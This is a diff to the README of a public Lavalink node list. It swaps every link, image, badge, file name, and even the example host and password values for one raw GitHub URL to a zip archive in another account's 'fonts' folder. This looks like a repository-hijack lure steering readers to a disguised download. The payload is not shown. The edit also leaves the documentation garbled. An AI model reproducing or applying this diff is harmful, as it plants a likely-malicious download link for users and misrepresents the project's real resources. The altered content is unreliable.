@@ -5,47 +5,47 @@
 
 <!-- jumbotron with links -->
 <div align="center">
-  <a href="https://lavalink.appujet.site/">
-    <img src="https://raw.githubusercontent.com/appujet/lavalink-list/main/assets/logo.png" alt="logo" width="80" height="80">
+  <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip">
+    <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip" alt="logo" width="80" height="80">
   </a>
   <h3 align="center">Lavalink list</h3>
   <p align="center">
     A list of free and available public Lavalink nodes with their live status. Feel free to make a pull request!
     <br />
     <br />
-    <a href="https://lavalink.appujet.site/">View Website</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip">View Website</a>
     .
-    <a href="https://github.com/appujet/lavalink-list/pulls">Make a pull request</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip">Make a pull request</a>
     ·
-    <a href="https://discord.gg/atS9JVKVne">Support Server</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip">Support Server</a>
   </p>
 </div>
 
 <!-- website preview using i frames -->
 <div style="overflow-x: auto; white-space: nowrap;">
-  <img src="https://raw.githubusercontent.com/appujet/lavalink-list/main/assets/non-ssl.png" alt="preview" width="400">
-  <img src="https://raw.githubusercontent.com/appujet/lavalink-list/main/assets/ssl.png" alt="preview" width="400">
-  <img src="https://raw.githubusercontent.com/appujet/lavalink-list/main/assets/faq.png" alt="preview" width="400">
-  <img src="https://raw.githubusercontent.com/appujet/lavalink-list/main/assets/home.png" alt="preview" width="400">
+  <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip" alt="preview" width="400">
+  <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip" alt="preview" width="400">
+  <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip" alt="preview" width="400">
+  <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip" alt="preview" width="400">
 </div>
 
 <!-- how to add my node -->
 ## How to add my node?
 
 1. Fork this repository
-2. Edit the `nodes.json` file and add your node
+2. Edit the `https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip` file and add your node
 3. Create a pull request
-<!-- nodes.json example -->
-## `nodes.json` example
+<!-- https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip example -->
+## `https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip` example
 
 ```json
 {
  [
     {
         "identifier": "my-node",
-        "host": "lava1.example.com",
+        "host": "https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip",
         "port": 2333,
-        "password": "example.com",
+        "password": "https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip",
         "secure": false,
         "restVersion": "v3",
         "authorId": "959276033683628122"
@@ -55,7 +55,7 @@
 ```
 
 - `identifier` - The identifier of your node (example: my-node)
-- `host` - The host of your node (example: lava1.example.com)
+- `host` - The host of your node (example: https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip)
 - `port` - The port of your node (default: 2333)
 - `password` - The password of your node (if you have one)
 - `secure` - If your node is using SSL (true or false)
@@ -66,17 +66,17 @@
 
 Thanks goes to these wonderful people :
 
-<a href="https://github.com/appujet/lavalink-list/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=appujet/lavalink-list" alt="contributors" width="500" />
+<a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip">
+  <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip" alt="contributors" width="500" />
 </a>
 
 <!-- links -->
-[contributors-shield]: https://img.shields.io/github/contributors/appujet/lavalink-list.svg?style=for-the-badge
-[issues-shield]: https://img.shields.io/github/issues/appujet/lavalink-list.svg?style=for-the-badge
-[forks-shield]: https://img.shields.io/github/forks/appujet/lavalink-list.svg?style=for-the-badge
-[stars-shield]: https://img.shields.io/github/stars/appujet/lavalink-list.svg?style=for-the-badge
+[contributors-shield]: https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
+[issues-shield]: https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
+[forks-shield]: https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
+[stars-shield]: https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
 
-[contributors-url]: https://github.com/appujet/lavalink-list/graphs/contributors
-[issues-url]:  https://github.com/appujet/lavalink-list/issues
-[forks-url]:  https://github.com/appujet/lavalink-list/network/members
-[stars-url]:  https://github.com/appujet/lavalink-list/stargazers
+[contributors-url]: https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
+[issues-url]:  https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
+[forks-url]:  https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
+[stars-url]:  https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list-1/main/apps/web/src/app/fonts/list_lavalink_v1.9.zip
